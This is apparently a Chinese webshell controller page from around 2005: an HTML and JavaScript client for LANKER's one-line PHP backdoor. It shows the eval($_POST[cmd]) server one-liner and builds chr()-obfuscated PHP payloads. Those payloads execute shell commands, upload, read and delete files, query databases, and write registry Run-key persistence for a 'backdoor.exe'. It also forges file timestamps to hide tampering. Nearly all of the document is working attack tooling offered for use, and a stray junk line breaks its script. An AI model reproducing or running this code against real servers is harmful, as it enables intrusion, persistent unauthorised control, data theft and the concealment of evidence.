
<HTML><HEAD>
<!-- codz by LANKER(QQ:18779569) 2005/1/1-->
<META content="text/html; charset=gb2312" http-equiv=Content-Type>
<META content="MSHTML 5.00.2614.3500" name=GENERATOR>
<style>
<!--
 td		{font-size:8pt; color: #666666;font-family:Verdana}
 INPUT		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}
 textarea	{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
 select		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
 BODY		{font-size:9pt; color: #666666;font-family:Verdana; SCROLLBAR-FACE-COLOR: #ffffff; background color:#eeeeee;cursor:SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #aaaaaa; SCROLLBAR-3DLIGHT-COLOR: #aaaaaa; SCROLLBAR-ARROW-COLOR: #dddddd; SCROLLBAR-TRACK-COLOR: #ffffff; SCROLLBAR-DARKSHADOW-COLOR: #ffffff }
 a:link		{text-decoration:none; color:#336699} 
 a:visited	{text-decoration:none; color:#336699} 
 a:active	{text-decoration:none; color:#336699} 
 a:hover	{COLOR: #b4c8d8; }
 .tb		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#cccccc}
 .tb0		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#fcfcfc}
 .tb1		{background-color:#ffffff} </style>
-->
</STYLE>
</HEAD>
<BODY style="FONT-SIZE: 9pt" bgcolor="#cccccc">
<CENTER style="cursor:hand;">
<font color="#000080">
lanker一句话PHP后门客户端3.0</font><FONT color=#ff3300>内部版</font>
</CENTER>
<hr size="1" color="#000080">
<FORM ENCTYPE="multipart/form-data" name=frm method=post target=qq2>
<TABLE style="FONT-SIZE: 9pt">
<TD width=750 height=10>后门地址: <INPUT                                                          
style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
size=60 value=http://127.0.0.1/door.php name=act> 密码: <INPUT                                                          后门
style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid" 
size=10 value=cmd name=para>生成器：<textarea   rows='1' name='tmpcmd' cols='23'>&lt;?php eval($_POST[cmd]?;&gt;</textarea></TD></TABLE>
<TABLE width=750 >
<TD bgcolor=#ffffff><TABLE style="FONT-SIZE: 9pt" ><tr width=200 height=10>
<select onchange="showDiv(this.value);">
<option value="digest" >----基本功能列表----</option>
<option value="2" >PHP环境变量</option>
<option value="16" >服务器基本信息</option>
<option value="1" >本程序目录</option>
<option value="3" >执行CMD命令</option>
<option value="17" >无回显CMD命令</option>
<option value="6" >读取目录</option>
<option value="14" >创建目录</option>
<option value="15" >删除目录</option>
<option value="4" >上传文件</option>
<option value="5" >读取文件</option>
<option value="12" >创建文件</option>
<option value="7" >复制文件</option>
<option value="8" >重命名文件</option>
<option value="9" >删除文件</option>
<option value="13" >下载文件</option>
<option value="21" >克隆文件时间</option>
<option value="22" >在线代理</option>
<option value="11" >执行SQL语句</option>
<option value="18" >读取注册表</option>
<option value="19" >写入注册表</option>
<option value="20" >删除注册表</option>
<option value="10" >专家模式(自己写代码)</option>
</select></tr><tr height=260><TD id="yunxing" ><FONT color=#ff3300>LANKER微型PHP后门服务端代码：<br>&lt;?php eval($_POST[cmd])?><hr size="1" color="#000080"><br>容错代码为：<br>&lt;?php @eval($_POST[cmd])?></font><TD></tr></TABLE></td><td><TABLE style="FONT-SIZE: 9pt"><IFRAME border=1 height=340 width=580 name=qq2 marginwidth=0 marginheight=0 vspace=0
	  src="about:blank" 
      frameborder=no scrolling=auto></IFRAME></TABLE></td></table>
</form>

<hr size="1" color="#000000">
<CENTER>
<center>
<FONT color=#ff3300>声明:此版为内部版，未经授权允许严禁传给他人和提供公开下载！谢谢合作！By lanker</font></center>
</BODY></HTML>
<script language="javascript">
function showDiv(aa){

switch(aa) 
{ 

case "2":
yunxing.innerHTML="<p align='center'>本程序目录<br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"echo dirname(__FILE__);\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "1":
yunxing.innerHTML="PHP环境变量<br>"
yunxing.innerHTML+="<p align='center'><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"phpinfo();\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>" 
break;

case "3": 
yunxing.innerHTML="<p align='center'>执行函数:<br><select name='execfun'><option value='system' selected>system</option><option value='syscom'>调用COM对象(适用WINNT)</option><option value='passthru'>passthru</option><option value='`'>反引号(`)</option><option value='shell_exec'>shell_exec</option><option value='exec'>exec</option><option value='popen'>popen</option></select><br><br>命令:<br><INPUT size=24 name=\"cmdname\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;cmd();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "4": 
yunxing.innerHTML="文件路径(不填为当前目录)<br><input type=text name='uploaddir' value='c:/lanker' size=24><p align='center'><input NAME='LanKerF' TYPE='file' size=13><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;upfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "5": 
yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"duqu\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;readfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "6": 
yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"duqu\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;readdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "7": 
yunxing.innerHTML="<p align='center'>文件1:<br><INPUT  size=24 name=\"file1\"><br>文件2:<br><INPUT   size=24 name=\"file2\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;copyfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "8": 
yunxing.innerHTML="<p align='center'>文件1:<br><INPUT   size=24 name=\"file1\"><br>文件2:<br><INPUT size=24 name=\"file2\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;renamefile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "9": 
yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"filen\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;delfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "10":
yunxing.innerHTML="<p align='center'><textarea  rows='12' name='duqu' cols='22'>phpinfo();</textarea>"
yunxing.innerHTML+="<INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=frm.duqu.value;frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br>字符转换工具:<hr size='1' color='#000000'>要转换的字符:<br><INPUT type=text name=\"inputstr\" size='23' ><br>转换后的字符:<br><textarea cols='22' rows=\"4\" name=\"chrstr\" ></textarea><br><INPUT  type=button name=strtxtdd onclick=\"ascchar()\"  value=\"转 换\" >"
break;
case "11":
yunxing.innerHTML="主机：<input NAME=\"servername\" TYPE=\"text\" value=\"localhost\" size=\"12\"   ><BR>数据库：<input NAME=\"dbname\" TYPE=\"text\" value size=\"10\"   > &nbsp;<BR>用户名：<input NAME=\"dbusername\" TYPE=\"text\" value=\"root\" size=\"10\"   >&nbsp; <BR>密码：<input NAME=\"dbpassword\" TYPE=\"text\" value size=\"12\"   > &nbsp; <BR>SQL语句:<BR><textarea rows=\"8\" name=\"sql\" cols=\"20\"   ></textarea>"
yunxing.innerHTML+="<br><INPUT    onclick='Javascipt:frm.tmpcmd.name=frm.para.value;SQL();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send>"
break;


case "12": 
yunxing.innerHTML="<p align='center'>文件名:<INPUT   size=14 name=\"filen\"><br>文件内容:<BR><textarea rows=\"16\" name=\"filec\" cols=\"20\"   ></textarea><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;createfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "13": 
yunxing.innerHTML="<p align='center'>文件名:<br><INPUT   size=24 name=\"filen\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;downfile();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "14": 
yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"dir\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;createdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "15": 
yunxing.innerHTML="<p align='center'>目录名:<br><INPUT   size=24 name=\"dir\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;rmdir();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "16":
yunxing.innerHTML="<p align='center'>服务器基本信息<br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;info();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "17": 
yunxing.innerHTML="<p align='center'>文件:<br><INPUT  size=24 name=\"cmdpath\" value=\"c:/winnt/system32/cmd.exe\"><br>参数:<br><INPUT size=24 name=\"runfile\" value=\"/c net user > c:/log.txt\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;runcmd();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "18": 
yunxing.innerHTML="<p align='center'>键值:<br><INPUT  size=24 name=\"regpath\" value=\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;readreg();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "19": 
yunxing.innerHTML="<p align='center'>键值:<br><INPUT  size=24 name=\"regpath\" value=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor\"><br>类型:<select name='regtype'><option value='REG_SZ' selected>REG_SZ</option><option value='REG_BINARY' >REG_BINARY</option><option value='REG_DWORD' >REG_DWORD</option><option value='REG_MULTI_SZ' >REG_MULTI_SZ</option><option value='REG_EXPAND_SZ' >REG_EXPAND_SZ</option></select><br>值:<INPUT  size=24 name=\"regval\" value=\"c:\\winnt\\backdoor.exe\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;writereg();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "20": 
yunxing.innerHTML="<p align='center'>键值:<br><INPUT  size=24 name=\"regpath\" value=\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;delreg();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "21": 
yunxing.innerHTML="<p align='center'>参照文件:<br><INPUT   size=24 name=\"file1\" value=\"c:\\boot.ini\"><br>克隆文件:<br><INPUT size=24 name=\"file2\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;domodtime();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "22": 
yunxing.innerHTML="<p align='center'>URL:<INPUT size=24 name=\"url\"><br><INPUT   onclick='Javascipt:frm.tmpcmd.name=frm.para.value;urlproxy();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='提 交' name=Send><br><br><br><br><br><br><br><br><br><br>"
break; 
} 
}

function urlproxy(){
frm.tmpcmd.value="$url="
frm.tmpcmd.value+=duqu(frm.url.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if (isset($url)) {$proxycontents = @file_get_contents($url);\n"
frm.tmpcmd.value+=" echo ($proxycontents) ? $proxycontents:获取URL内容失败;}\n"
}


function domodtime(){
frm.tmpcmd.value="$file1="
frm.tmpcmd.value+=duqu(frm.file1.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$file2="
frm.tmpcmd.value+=duqu(frm.file2.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$time=@filemtime($file1);\n"
frm.tmpcmd.value+="echo (@touch($file2,$time,$time)) ? basename($file2).的修改时间成功改为.date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115),$time).chr(33) : 文件的修改时间修改失败;\n"
}

function writereg(){
frm.tmpcmd.value="$regpath="
frm.tmpcmd.value+=duqu(frm.regpath.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$regtype="
frm.tmpcmd.value+=duqu(frm.regtype.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$regval="
frm.tmpcmd.value+=duqu(frm.regval.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$s= &new COM(chr(87).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46).chr(83).chr(104).chr(101).chr(108).chr(108));\n"
frm.tmpcmd.value+="$a=@$s->RegWrite($regpath,$regval,$regtype);\n"
frm.tmpcmd.value+="echo ($a==0) ? chr(79).chr(75).chr(33) : chr(70).chr(65).chr(73).chr(76).chr(33);"
}

function delreg(){
frm.tmpcmd.value="$regpath="
frm.tmpcmd.value+=duqu(frm.regpath.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$s= &new COM(chr(87).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46).chr(83).chr(104).chr(101).chr(108).chr(108));"
frm.tmpcmd.value+="$a=@$s->RegDelete($regpath);\n"
frm.tmpcmd.value+="echo ($a==0) ? chr(79).chr(75).chr(33) : chr(70).chr(65).chr(73).chr(76).chr(33);"
}

function readreg(){
frm.tmpcmd.value="$regpath="
frm.tmpcmd.value+=duqu(frm.regpath.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$shell= &new COM(chr(87).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46).chr(83).chr(104).chr(101).chr(108).chr(108));"
frm.tmpcmd.value+="var_dump(@$shell->RegRead($regpath));\n"

}



function runcmd(){
frm.tmpcmd.value="$a="
frm.tmpcmd.value+=duqu(frm.cmdpath.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$b="
frm.tmpcmd.value+=duqu(frm.runfile.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$s= &new COM(chr(83).chr(104).chr(101).chr(108).chr(108).chr(46).chr(65).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110));\n"
frm.tmpcmd.value+="$c = $s->ShellExecute($a,$b);\n"
frm.tmpcmd.value+="if(!$c) echo chr(79).chr(75).chr(33);\n"

}




function cmd(){

if (frm.execfun.value =='syscom'){
frm.tmpcmd.value="$cmd="
frm.tmpcmd.value+=duqu(frm.cmdname.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="echo chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(99).chr(111).chr(108).chr(115).chr(61).chr(56).chr(48).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(50).chr(54).chr(62);\n"
frm.tmpcmd.value+="$wsh = new COM(chr(87).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46).chr(83).chr(104).chr(101).chr(108).chr(108)) or die(chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(33));\n"
frm.tmpcmd.value+="$exec = $wsh->exec(chr(99).chr(109).chr(100).chr(46).chr(101).chr(120).chr(101).chr(32).chr(47).chr(99).chr(32).$cmd);\n"
frm.tmpcmd.value+="$stdout = $exec->StdOut ();\n"
frm.tmpcmd.value+="$stroutput = $stdout->ReadAll ();\n"
frm.tmpcmd.value+="echo ($stroutput);\n"
frm.tmpcmd.value+="echo chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62);\n"
}

else{
if (frm.execfun.value =='`'){
frm.tmpcmd.value="$cmd="
frm.tmpcmd.value+=duqu(frm.cmdname.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="echo chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(99).chr(111).chr(108).chr(115).chr(61).chr(56).chr(48).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(50).chr(54).chr(62);\n"
frm.tmpcmd.value+="echo"
frm.tmpcmd.value+=frm.execfun.value
frm.tmpcmd.value+="$cmd"
frm.tmpcmd.value+=frm.execfun.value
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="echo chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62);\n"

}
else{
frm.tmpcmd.value="$cmd="
frm.tmpcmd.value+=duqu(frm.cmdname.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="echo chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(99).chr(111).chr(108).chr(115).chr(61).chr(56).chr(48).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(50).chr(54).chr(62);\n"
frm.tmpcmd.value+="echo "
frm.tmpcmd.value+=frm.execfun.value
frm.tmpcmd.value+="($cmd);\n"
frm.tmpcmd.value+="echo chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62);\n"
}
}
}




function copyfile(){
frm.tmpcmd.value="$file1="
frm.tmpcmd.value+=duqu(frm.file1.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$file2="
frm.tmpcmd.value+=duqu(frm.file2.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if (@copy($file1,$file2)) echo chr(79).chr(75).chr(33);\n"
}




function renamefile(){

frm.tmpcmd.value="$file1="
frm.tmpcmd.value+=duqu(frm.file1.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$file2="
frm.tmpcmd.value+=duqu(frm.file2.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if (@rename($file1,$file2)) echo chr(79).chr(75).chr(33);\n"
}



function downfile(){
frm.tmpcmd.value="$df="
frm.tmpcmd.value+=duqu(frm.filen.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$f=chr(46);"
frm.tmpcmd.value+="$h=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(116).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45);\n"
frm.tmpcmd.value+="$h1=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61);\n"
frm.tmpcmd.value+="$h2=(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(80).chr(72).chr(80).chr(51).chr(32).chr(71).chr(101).chr(110).chr(101).chr(114).chr(97).chr(116).chr(101).chr(100).chr(32).chr(68).chr(97).chr(116).chr(97);\n"
frm.tmpcmd.value+="$h3=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58);\n"
frm.tmpcmd.value+="$fn = @basename($df);\n"
frm.tmpcmd.value+="$fe = $finfo[count($finfo)-1];\n"
frm.tmpcmd.value+="$finfo = explode($f, $fn);\n"
frm.tmpcmd.value+="header($h.$fe);\n"
frm.tmpcmd.value+="header($h1.$fn);\n"
frm.tmpcmd.value+="header($h2);\n"
frm.tmpcmd.value+="header($h3.filesize($df));\n"
frm.tmpcmd.value+="@readfile($df);\n"
frm.tmpcmd.value+="exit;\n"
}


function readfile(){
frm.tmpcmd.value="$filename="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$s=chr(60).chr(112).chr(114).chr(101).chr(62);\n"
frm.tmpcmd.value+="$e=chr(60).chr(47).chr(112).chr(114).chr(101).chr(62);\n"
frm.tmpcmd.value+="$fp=@fopen($filename,r);\n"
frm.tmpcmd.value+="$contents=@fread($fp, filesize($filename));\n"
frm.tmpcmd.value+="@fclose($fp);\n"
frm.tmpcmd.value+="$contents=htmlspecialchars($contents);\n"
frm.tmpcmd.value+="echo $s.$contents.$e;\n"
}
function readdir(){
frm.tmpcmd.value="$dir="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$f = chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="$dir=@dir($dir);"
frm.tmpcmd.value+="if($dir) "
frm.tmpcmd.value+="{"
frm.tmpcmd.value+="  echo path_______.$dir->path.$f;"
frm.tmpcmd.value+="  while($entry=$dir->read())"
frm.tmpcmd.value+="	{"
frm.tmpcmd.value+=" echo ____.$entry.$f; "
frm.tmpcmd.value+="  }"
frm.tmpcmd.value+="  $dir->close();"
frm.tmpcmd.value+="}"
frm.tmpcmd.value+="else"
frm.tmpcmd.value+="{echo 0;}"
}

function SQL(){
frm.tmpcmd.value="$message=chr(102).chr(97).chr(105).chr(108).chr(33);\n"
frm.tmpcmd.value+="$fgf=chr(32);\n"
if(frm.dbpassword.value !=''){
frm.tmpcmd.value+="$dbpassword= "
frm.tmpcmd.value+=duqu(frm.dbpassword.value)
frm.tmpcmd.value+=";\n"
}
frm.tmpcmd.value+="$servername="
frm.tmpcmd.value+=duqu(frm.servername.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$dbusername="
frm.tmpcmd.value+=duqu(frm.dbusername.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$dbname="
frm.tmpcmd.value+=duqu(frm.dbname.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$sql="
frm.tmpcmd.value+=duqu(frm.sql.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="@mysql_connect($servername,$dbusername,$dbpassword) or die($message);\n"
frm.tmpcmd.value+="@mysql_select_db($dbname) or die($message);\n"
frm.tmpcmd.value+="$sql=stripslashes($sql);\n"
frm.tmpcmd.value+="$result = @mysql_query($sql);\n"
frm.tmpcmd.value+="while($row=mysql_fetch_array($result,MYSQL_BOTH)){\n"
frm.tmpcmd.value+="for($j=0;$j<count($row);$j++){\n"
frm.tmpcmd.value+="print($row[$j].$fgf);}\n"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);}\n"
frm.tmpcmd.value+="mysql_free_result($result);\n"
frm.tmpcmd.value+="mysql_close();\n"

}

function createfile(){

frm.tmpcmd.value="$filen="
frm.tmpcmd.value+=duqu(frm.filen.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$filec="
frm.tmpcmd.value+=duqu(frm.filec.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$a=chr(119);\n"
frm.tmpcmd.value+="$fp=@fopen($filen,$a);\n"
frm.tmpcmd.value+="$msg=@fwrite($fp,$filec);\n"
frm.tmpcmd.value+="if($msg) echo chr(79).chr(75).chr(33);\n"
frm.tmpcmd.value+="@fclose($fp);\n"
}

11111111111111111


function delfile(){
frm.tmpcmd.value="$filen="
frm.tmpcmd.value+=duqu(frm.filen.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if(@unlink($filen)) echo chr(79).chr(75).chr(33);"
}

function createdir(){
frm.tmpcmd.value="$dirs="
frm.tmpcmd.value+=duqu(frm.dir.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if(@mkdir($dirs,0777)) echo chr(79).chr(75).chr(33);"
}

function rmdir(){
frm.tmpcmd.value="$dirs="
frm.tmpcmd.value+=duqu(frm.dir.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="if(@rmdir($dirs)) echo chr(79).chr(75).chr(33);"
}

function upfile(){
frm.tmpcmd.value="$uploaddir="
frm.tmpcmd.value+=duqu(frm.uploaddir.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value="if (strlen($uploaddir)<1){\n"
frm.tmpcmd.value+="$updir=$_FILES[LanKerF][name];}\n"
frm.tmpcmd.value+="else{\n"
frm.tmpcmd.value+="$updir=$uploaddir.chr(47).$_FILES[LanKerF][name];}\n"
frm.tmpcmd.value+="if(@copy($_FILES[LanKerF][tmp_name],$updir)) echo upfile.chr(58).$updir.chr(32).chr(32).OK.chr(33);"
}

function ascchar(){
frm.chrstr.value=duqu(frm.inputstr.value)
}

function info(){
frm.tmpcmd.value="echo 服务器系统.chr(58);"
frm.tmpcmd.value+="echo PHP_OS;"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo 服务器操作系统文字编码.chr(58);"
frm.tmpcmd.value+="echo $_SERVER[HTTP_ACCEPT_LANGUAGE];"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo 服务器IP.chr(58);"
frm.tmpcmd.value+="echo $_SERVER[SERVER_NAME];"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo Web服务端口端口.chr(58);"
frm.tmpcmd.value+="echo $_SERVER[SERVER_PORT];"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo PHP运行方式.chr(58);"
frm.tmpcmd.value+="echo strtoupper(php_sapi_name());"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo PHP版本.chr(58);"
frm.tmpcmd.value+="echo PHP_VERSION;"
frm.tmpcmd.value+="echo chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="echo 本文件路径.chr(58);"
frm.tmpcmd.value+="echo $_SERVER[PATH_TRANSLATED];"
}
</script>
<script >
function duqu(strcode){ 
var duqu="";
for(i=1;i<strcode.length;i++){
if(strcode.charCodeAt(i-1)<256){
duqu+="chr("+strcode.charCodeAt(i-1)+").";
}
else
duqu+=strcode.charAt(i-1)+".";
}
if(strcode.charCodeAt(i-1)<256){
duqu+="chr("+strcode.charCodeAt(strcode.length-1)+")";
}
else
duqu+=strcode.charAt(strcode.length-1);
return duqu
}
</script>
